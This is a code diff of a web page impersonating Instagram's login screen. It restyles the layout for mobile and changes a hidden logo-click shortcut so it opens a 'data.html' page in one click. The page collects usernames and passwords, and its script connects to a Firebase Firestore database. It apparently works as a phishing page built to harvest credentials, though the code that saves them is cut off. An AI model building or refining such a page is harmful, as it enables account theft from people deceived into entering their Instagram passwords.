@@ -2,34 +2,40 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Instagram Login</title>
   <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
     body {
       font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
       background-color: #fff;
-      margin: 0;
-      padding: 0;
       display: flex;
-      justify-content: center;
+      flex-direction: column;
       align-items: center;
       min-height: 100vh;
-    }
-    .container {
-      max-width: 935px;
-      width: 100%;
-      padding: 0 20px;
-      margin: auto;
-    }
-    .login-form {
-      width: 350px;
-      margin: 0 auto;
-      text-align: center;
-      padding: 30px 0;
+      padding: 20px;
     }
     .logo {
-      font-size: 30px;
+      font-size: 40px;
       margin-bottom: 20px;
       cursor: pointer;
+    }
+    .login-form {
+      width: 100%;
+      max-width: 350px;
+      padding: 20px;
+      border-radius: 4px;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+      background-color: white;
+      margin-top: 20px;
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
     }
     input[type="text"], input[type="password"] {
       width: 100%;
@@ -47,18 +53,25 @@
       border-radius: 4px;
       cursor: pointer;
     }
+    @media (max-width: 480px) {
+      .logo {
+        font-size: 30px;
+      }
+      .login-form {
+        width: 90%;
+      }
+    }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="login-form">
-      <div class="logo" id="instagramLogo">Instagram</div>
-      <form id="loginForm">
-        <input type="text" id="username" placeholder="Phone number, username, or email" required>
-        <input type="password" id="password" placeholder="Password" required>
-        <button type="submit">Log in</button>
-      </form>
-    </div>
+  <div class="logo" id="instagramLogo">Instagram</div>
+  <div class="login-form">
+    <h2>Login</h2>
+    <form id="loginForm">
+      <input type="text" id="username" placeholder="Phone number, username, or email" required>
+      <input type="password" id="password" placeholder="Password" required>
+      <button type="submit">Log in</button>
+    </form>
   </div>
 
   <script type="module">
@@ -80,13 +93,8 @@
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
-    let clickCount = 0;
     document.getElementById('instagramLogo').addEventListener('click', () => {
-      clickCount++;
-      if (clickCount >= 5) {
-        window.open('data.html', '_blank');
-        clickCount = 0; // Reset counter
-      }
+      window.open('data.html', '_blank');
     });
 
     document.getElementById('loginForm').addEventListener('submit', async (e) => {
